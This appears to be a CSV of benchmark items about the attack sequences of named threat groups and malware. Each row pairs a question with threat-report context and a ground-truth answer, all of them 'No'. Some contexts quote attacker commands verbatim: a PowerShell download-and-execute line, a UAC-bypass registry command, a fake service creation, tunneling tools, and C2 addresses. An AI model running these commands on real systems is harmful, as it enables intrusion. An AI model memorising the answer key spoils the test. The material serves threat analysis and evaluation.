Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth
117,22,22-Initial Access-T1190-Exploit Public-Facing Application,"After exploiting CVE-2017-9841 to gain initial access on unpatched PHPUnit systems, is it likely that the Tuyul malware will periodically download a bash script named 'cron' to maintain persistence before executing Perl scripts and shell commands on victim systems?","Initial Access: On January 15, 2020, F5 threat researchers detected a new campaign exploiting a vulnerability in PHPUnit systems (CVE-2017-9841) to install an IRC bot named Tuyul. The malware specifically targets unpatched PHPUnit, a PHP unit testing framework, allowing the attacker to inject arbitrary PHP code on the server.","Execution: The Tuyul botnet, written in Perl, is used to execute commands on victim systems. The malware source code includes functionalities such as promoting bots to higher privilege (pro), demoting bots (noob), updating malware, connecting to reverse shells (bc), executing shell commands (shell), running Perl scripts (perl), and terminating the bot's connection (terminate, suicide).
Persistence: To maintain persistence, the Tuyul malware periodically downloads a bash script named 'cron' to ensure its continued presence on the system. It also includes functionality to detect and terminate processes from other malware infections.
Defense Evasion: The Tuyul malware employs a binary version that goes undetected by antivirus engines, allowing it to operate on the machine without signature-based detection. Additionally, the malware uses various PHP web shells to gain access to servers, including an open-source application called Tiny File Manager and an unknown advanced web shell.
Command and Control: The Tuyul botnet uses the domain irc[.]localroot[.]xyz as its command and control (C&C) server, which hosts the malware files and has a valid SSL certificate. The attacker also maintains two development servers for script development and testing, and for logging successful infections. The C&C server and development servers are protected by Cloudflare.
Others: The Tuyul botnet has possible Indonesian attribution based on several clues, including the time zone set to Asia/Jakarta, the botnet name, admin nicknames, and repository server. The botnet's peak size was 366 victim systems, which is smaller compared to other botnets. The infected servers are primarily hosted on cloud services such as AWS, DigitalOcean, and Linode, with a significant number located in the U.S. and U.K. The botnet's name, Tuyul, refers to a figure in Southeast Asian folklore, particularly Indonesian, which is an undead infant invoked for theft and other crimes. The botnet is actively being worked on and is expected to grow.",No
1574,376,2202-Credential Access-T1056.001-Keylogging,"After scanning for machines in the target's network environment using tools like HUC Port Banner Scanner and fscan, is it likely that Earth Lusca will gather account credentials via a BlackEnergy keylogger plugin before exploiting remote services for lateral movement within the network?","Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",No
1216,302,1570-Collection-T1560.003-Archive via Custom Method,"After monitoring antimalware logs and the Windows process list using PowerStallion, is it likely that Turla will compress output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm before executing additional PowerShell scripts for collecting recent files from the local file system?","Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",No
166,34,1914-Lateral Movement-T1550-Use Alternate Authentication Material,"After conducting internal reconnaissance using common Windows tools and open-source pentesting tools for discovery, is APT10 likely to abuse a compromised AD FS server's SAML token for lateral movement instead of leveraging shared MSP infrastructure before staging exfiltration data in multi-part archives in the Recycle Bin using compression tools?",Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.,"Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",No
1679,398,398-Impact-T1565-Data Manipulation,"After using the manipulated debit cards to perform cash withdrawals from various ATMs, will attackers manipulate the bank's internal systems to enable high overdraft levels and remove anti-fraud controls only after coordinating ATM withdrawals across multiple cities and countries using command and control with physical mules?","Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.",No
73,11,11-Discovery-T1083-File and Directory Discovery,"After ensuring persistence by creating a Windows service that initiates at system startup, is it likely that the malware collects and exfiltrates stolen HWP documents through encrypted emails before gathering information about the infected computer, including file and directory discovery?","Discovery: The malware gathers information about the infected computer, including system and user names, and outputs of the systeminfo command. It also collects keystrokes and directory listings.","Initial Access: For several months, an ongoing cyber-espionage campaign has been targeting South Korean think-tanks. The initial Trojan dropper, functioning as a loader for further malware, is typically delivered by spear-phishing emails. This dropper is a Dynamic Link Library that delivers another encrypted library from its resource section, which performs espionage functions.
Execution: Upon infection, the malware uses the Metasploit Framework's code to inject malicious code into explorer.exe on Windows 7 systems. It decrypts a spying library, saves it to disk with a hardcoded name in the user's temporary folder, and loads it as a library. This library then copies itself into the System32 directory and creates a service to ensure persistence.
Persistence: The malware ensures its persistence by copying itself into the System32 directory and creating a service with varying names such as DriverManage, WebService, and WebClientManager. These services are initiated at system startup.
Defense Evasion: The malware disables the system firewall and AhnLab firewall by modifying registry values. It also turns off the Windows Security Center service to prevent alerts about the disabled firewall. The attackers specifically target AhnLab security products, which are commonly used in South Korea, and do not bother evading foreign vendors' products.
Collection: The malware collects keystrokes, directory listings, and HWP documents. It sends this collected data to the attackers through encrypted emails.
Command and Control: Communication between the malware and the attackers occurs through a Bulgarian web-based free email server, mail.bg. The malware uses hardcoded credentials to send and receive instructions via email.
Exfiltration: The malware exfiltrates collected data, including system information, user-related info, and keystrokes, by encrypting it with RC4 and sending it to the attackers' email accounts.
Others: The campaign, attributed to the threat actor 'Kimsuky,' is suspected to originate from North Korea, given the targeted entities and the attackers' IP addresses located in China's Jilin and Liaoning provinces, which maintain lines into North Korea. The malware uses various files and MD5 hashes, and it creates services with specific names to operate. The attackers use modified TeamViewer components for remote control, and the malware is detected as Trojan.Win32.Kimsuky, except for the TeamViewer components, which are detected as Trojan.Win32.Patched.ps.",No
28,6,2637-Collection-T1056.004-Credential API Hooking,"After enumerating browser data such as bookmarks and reporting window names during discovery, is Machete likely to hook several Windows API functions to steal credentials before using Command and Control channels like FTP and HTTP for communication with its servers?","Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",No
1427,341,341-Collection-T1056-Input Capture,"After performing keylogging for Collection using libCache32.exe, is it likely that the spyware will extract Chrome passwords for Credential Access by querying Google Chrome's SQLite databases using libchrome.exe?","Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",No
1171,285,285-Command and Control-T1071-Application Layer Protocol,"After the Taidoor malware communicates with the command-and-control servers roudan.serveftp.com and mac.gov.hpc.tw, is it likely that it avoids detection by using a downloader that decrypts a modified version of the malware?","Command and Control: The new Taidoor variant communicates with two CnC servers: roudan.serveftp.com and mac.gov.hpc.tw. The network traffic, or 'callback,' has been modified from the traditional version to use different file path names and formats.","Reconnaissance: The Taidoor malware campaign begins with a spear-phishing email sent to targets, which may include government agencies, corporate entities, and think tanks, particularly those with interests in Taiwan. The email entices recipients to open an attached file, which, if executed on a vulnerable system, silently installs malware.
Initial Access: The Taidoor malware is delivered via email attachments. When the attachment is opened, it exploits a vulnerability in Microsoft Office (CVE-2012-0158) to drop the malware onto the target's system. A decoy document containing legitimate content is simultaneously opened to alleviate any suspicions.
Execution: The Taidoor malware, once installed, begins to beacon to a command-and-control (CnC) server using a consistent HTTP GET request pattern that includes an encrypted MAC address of the compromised computer.
Defense Evasion: Taidoor has evolved to avoid common network detection signatures. The new variant uses a 'downloader' that retrieves encrypted text from Yahoo Blogs posts, which is then decrypted to a modified version of the Taidoor malware. This variant has also changed its network traffic pattern to avoid detection.
Others: The Taidoor malware has been active since 2008 and continues to be used in cyber espionage campaigns. It has undergone significant tactical changes in 2011 and 2012. The malware is not off-the-shelf and suggests a connection between various activities using Taidoor. Another malware family, 'Taleret,' uses a similar technique to Taidoor for CnC server communication. There is a frequent association with Taiwan and a similar CnC naming scheme between Taidoor and Taleret.",No
634,164,520-Defense Evasion-T1622-Debugger Evasion,"After the INOCNATION campaign gains initial access by using a decoy installer for Cisco AnyConnect Mobility Client and executes a malicious DLL payload with anti-behavioral analysis techniques, is it likely that the campaign will use Debugger Evasion tactics, such as the CheckRemoteDebuggerPresent function or checking system flags and CPU registers, before establishing command and control through encrypted HTTPS via SSL/TLS connections with additional XOR encoding?","Defense Evasion: The INOCNATION campaign's malware exhibited several defense evasion techniques, including the use of XOR obfuscation for components and strings, sandbox detection, and a mangled MZ header to deceive security products. The malware also employed string stacking obfuscation with Unicode strings and multiple layers of obfuscation for its command and control traffic.","Initial Access: The INOCNATION campaign utilized a decoy installer for Cisco AnyConnect Mobility Client to facilitate initial access. The installer, disguised as a legitimate application, would execute regardless of the victim's decision to cancel the installation, silently creating and entrenching the malware into the system's background. The use of a widely recognized security application as an embedded decoy indicates a sophisticated ploy to deceive average users or less experienced system administrators.
Execution: The INOCNATION campaign's RAT installer executed a malicious DLL payload, which was obfuscated and rebuilt during installation. The malware employed anti-behavioral analysis techniques, such as comparing mouse cursor positions to detect sandbox environments. Additionally, the malware used a mangled MZ header to deceive security products and evade detection.
Persistence: The RAT installer set up a persistence mechanism for the payload malware by creating a registry key for entrenchment. This key would be referenced during the uninstall routine, indicating the malware's capability to maintain its foothold on the system.
Command and Control: The malware used encrypted HTTPS via SSL/TLS connections for command and control communications, employing Windows' standard SSL/TLS libraries. To further obfuscate the communications, the malware used a single-byte XOR encoding within the decrypted SSL/TLS communication. This additional layer of obfuscation was designed to thwart detection and analysis efforts, even in environments with SSL inspection devices.
Others: The INOCNATION campaign's malware was capable of receiving commands from its C2 server, including process execution, reverse shell, file activity, uploading and downloading files, system information retrieval, and uninstalling the malware. The uninstall command suggests that the threat actor aimed to maintain a limited number of victims by removing the tool when commanded. Fidelis Cybersecurity's products detect the activity documented in this report, and additional technical indicators are published on their GitHub repository. The malware samples analyzed in this report were shared by CrowdStrike.",No
516,133,264-Defense Evasion-T1548.002-Bypass User Account Control,"Is it likely that the attackers will bypass User Account Control (UAC) to elevate privileges after delivering the RAT payload via email attachments or by tricking users into downloading files, but before maintaining persistence by creating a registry key pointing to PerfWatson.exe and nvSCPAPISrv.exe?","Defense Evasion: The attackers use a technique that ensures the RAT payload remains in memory throughout its execution, never touching the disk in a decrypted state, to evade detection by antivirus technologies. They also have the capability to detect the presence of a virtual machine to avoid analysis in a network sandbox. The NanoCore RAT payload is injected into a new process without being written to disk.","Initial Access: Attackers have traditionally deployed RATs (Remote Access Trojans) by tricking users into opening email attachments or downloading files from websites or peer-to-peer networks. These methods involve file-based vectors that are easier to detect.
Execution: The attackers have developed a sophisticated technique to execute RATs entirely in memory, avoiding disk interaction in a decrypted state, which helps them evade antivirus and 'next-generation' technologies focused on file-based threats. SentinelOne EPP has confirmed that this technique does not evade its behavior-based detection mechanisms, as it monitors all processes at the user-space/kernel-space interface.
Persistence: For persistence, the attackers create a registry key at HKEY_CURRENT_USER\Software\Microsoft\Windows\NT\CurrentVersion\Windows\Load pointing to the PerfWatson.exe binary, which is executed along with a copied binary named nvSCPAPISrv.exe located at %APPDATA%\Microsoft\Blend\14.0\FeedCache\.
Command and Control: The RAT attempts to connect back to its control server, which is associated with the domain chickenkiller.com, owned by a free dynamic DNS service. At the time of writing, the DNS records exist, but the address they resolve to appears to be down.
Others: The main sample analyzed is a 32-bit executable with various hashes provided. The unpacked samples include a packed 'Benchmark' DLL, a monitor named PerfWatson.exe, and the NanoCore RAT dumped from memory. The 'Benchmark' .NET DLL is XOR encrypted and contains logic to unpack and inject the RAT, as well as monitor the application. The settings and NanoCore executable are serialized, DES encrypted, and stored across multiple PNG files as pixel data. A C# decompilation method is used to extract information from the pixel data. SentinelOne provides resources on how to protect against such attacks.",No
1060,260,1263-Defense Evasion-T1027.011-Fileless Storage,"Is it likely that after initial access is gained via a JavaScript downloader employing ActiveXObject to execute PowerShell commands, Blind Eagle will use a backdoor to store its configuration in a registry key for defense evasion before placing a VBScript in the Startup folder to ensure persistence through system startup execution of batch files?","Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.
Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.
Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.
Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",No
